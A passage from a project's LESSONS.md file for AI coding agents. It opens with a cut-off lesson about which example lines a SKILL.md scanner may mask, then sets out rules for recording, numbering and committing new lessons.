  review found the same gap in `# AWS CLI reference` and `## Quick reference`._
  Mask a line only in example structure (an example heading, an `Example:`
  label, a quoted example, a fenced comment). In SKILL.md, the title never opens an
  example section, and a reference heading does so only when it starts with the
  word. Give the malicious fixture a title that contains an example word.

---

## How to add a new lesson

1. In the task where you learned it, before committing, append one bullet
   to the appropriate section above. Use the next `LN.M` number.
2. Keep it terse. One rule, one incident, one instruction. If you need
   three paragraphs, you're writing a design doc — put that elsewhere
   and link to it.
3. Commit the LESSONS.md change in the SAME commit as the fix that
   prompted it (not the checkbox-flip commit). This keeps the lesson
   married to the evidence.

## What does NOT belong here

- Generic best-practice advice ("write tests"). Only hard-won, project-
  specific lessons.
- Things already enforced by `CLAUDE.md` / `docs/agents/AGENT.md` / `.ralph/PROMPT.md`. If
  the rule is mechanical and can be checked, codify it there — LESSONS.md
  is the narrative companion, not the enforcement mechanism.
- Resolved bugs with no general lesson. Those belong in commit messages.
